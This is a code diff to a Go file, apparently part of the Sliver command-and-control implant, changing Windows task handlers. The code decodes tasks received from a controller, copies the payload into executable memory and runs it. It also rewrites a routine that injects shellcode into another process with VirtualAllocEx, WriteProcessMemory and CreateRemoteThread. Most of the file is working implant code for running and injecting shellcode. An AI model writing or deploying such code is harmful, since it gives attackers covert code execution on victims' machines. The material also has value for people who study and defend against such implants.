@@ -1,13 +1,17 @@
 package main
 
 import (
+	"log"
+	pb "sliver/protobuf"
 	"syscall"
 	"unsafe"
+
+	"github.com/golang/protobuf/proto"
 )
 
 var (
 	windowsHandlers = map[string]interface{}{
-		"task": taskHandler,
+		"task":       taskHandler,
 		"remoteTask": remoteTaskHandler,
 	}
 )
@@ -18,20 +22,31 @@ func getSystemHandlers() map[string]interface{} {
 
 // ---------------- Handlers ----------------
 func taskHandler(data []byte) {
-	size := len(data)
-	addr, err := sysAlloc(size)
+
+	task := &pb.Task{}
+	err := proto.Unmarshal(data, task)
 	if err != nil {
-		return err
+		log.Printf("Error decoding message: %v", err)
+		return
 	}
-	buf := (*[size]byte)(unsafe.Pointer(addr))
-	for index := 0; index < size; ++index {
-		buf[index] = data[index]
+
+	size := len(task.Data)
+	addr, _ := sysAlloc(size)
+	buf := (*[9999]byte)(unsafe.Pointer(addr))
+	for index := 0; index < size; index++ {
+		buf[index] = task.Data[index]
 	}
 	syscall.Syscall(addr, 0, 0, 0, 0)
-	return nil
+	return
 }
 
 func remoteTaskHandler(data []byte) {
+	task := &pb.Task{}
+	err := proto.Unmarshal(data, task)
+	if err != nil {
+		log.Printf("Error decoding message: %v", err)
+		return
+	}
 
 }
 
@@ -45,19 +60,6 @@ const (
 )
 
 var (
-	kernel32     = syscall.MustLoadDLL("kernel32.dll")
-	virtualAlloc = kernel32.MustFindProc("VirtualAlloc")
-)
-
-func sysAlloc(n uintptr) (uintptr, error) {
-	addr, _, err := virtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-	if addr == 0 {
-		return 0, err
-	}
-	return addr, nil
-}
-
-var (
 	kernel32           = syscall.MustLoadDLL("kernel32.dll")
 	virtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
 	virtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
@@ -66,6 +68,17 @@ var (
 	createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
 	createThread       = kernel32.MustFindProc("CreateThread")
 )
+
+type Handle uintptr
+
+func sysAlloc(size int) (uintptr, error) {
+	n := uintptr(size)
+	addr, _, err := virtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	if addr == 0 {
+		return 0, err
+	}
+	return addr, nil
+}
 
 func ptr(val interface{}) uintptr {
 	switch val.(type) {
@@ -78,24 +91,24 @@ func ptr(val interface{}) uintptr {
 	}
 }
 
-// InjectTask - Injects shellcode into a process handle
-func InjectTask(processHandle Handle, shellcode string) error {
+// injectTask - Injects shellcode into a process handle
+func injectTask(processHandle Handle, data []byte) error {
 
 	// Create native buffer with the shellcode
-	shellcodeSize := len(shellcode)
-	log.Println("[*] creating native shellcode buffer ...")
-	shellcodeAddr, _, err := virtualAlloc.Call(0, ptr(shellcodeSize), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-	if shellcodeAddr == 0 {
+	dataSize := len(data)
+	log.Println("[*] creating native data buffer ...")
+	dataAddr, _, err := virtualAlloc.Call(0, ptr(dataSize), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	if dataAddr == 0 {
 		return err
 	}
-	shellcodeBuf := (*[99999]byte)(unsafe.Pointer(shellcodeAddr))
-	for index, value := range []byte(shellcode) {
-		shellcodeBuf[index] = value
+	dataBuf := (*[9999]byte)(unsafe.Pointer(dataAddr))
+	for index, value := range data {
+		dataBuf[index] = value
 	}
 
 	// Remotely allocate memory in the target process
 	log.Println("[*] allocating remote process memory ...")
-	remoteAddr, _, err := virtualAllocEx.Call(uintptr(processHandle), 0, ptr(shellcodeSize), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	remoteAddr, _, err := virtualAllocEx.Call(uintptr(processHandle), 0, ptr(dataSize), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
 	log.Printf("[*] virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
 	if remoteAddr == 0 {
 		log.Println("[!] failed to allocate remote process memory")
@@ -103,15 +116,15 @@ func InjectTask(processHandle Handle, shellcode string) error {
 	}
 
 	// Write the shellcode into the remotely allocated buffer
-	writeMemorySuccess, _, err := writeProcessMemory.Call(uintptr(processHandle), uintptr(remoteAddr), uintptr(shellcodeAddr), ptr(shellcodeSize), 0)
+	writeMemorySuccess, _, err := writeProcessMemory.Call(uintptr(processHandle), uintptr(remoteAddr), uintptr(dataAddr), ptr(dataSize), 0)
 	log.Printf("[*] writeprocessmemory returned: writeMemorySuccess = %v, err = %v", writeMemorySuccess, err)
 	if writeMemorySuccess == 0 {
-		log.Printf("[!] failed to write shellcode into remote process")
+		log.Printf("[!] failed to write data into remote process")
 		return err
 	}
 
 	// Create the remote thread to where we wrote the shellcode
-	log.Println("[*] successfully injected shellcode, starting remote thread ....")
+	log.Println("[*] successfully injected data, starting remote thread ....")
 	createThreadSuccess, _, err := createRemoteThread.Call(uintptr(processHandle), 0, 0, uintptr(remoteAddr), 0, 0, 0)
 	log.Printf("[*] createremotethread returned: createThreadSuccess = %v, err = %v", createThreadSuccess, err)
 	if createThreadSuccess == 0 {
@@ -139,7 +152,7 @@ func RemoteThreadTaskInjection(processID int, data []byte) error {
 	if processHandle == 0 {
 		return err
 	}
-	err = InjectTask(processHandle, data)
+	err = injectTask(processHandle, data)
 	if err != nil {
 		return err
 	}
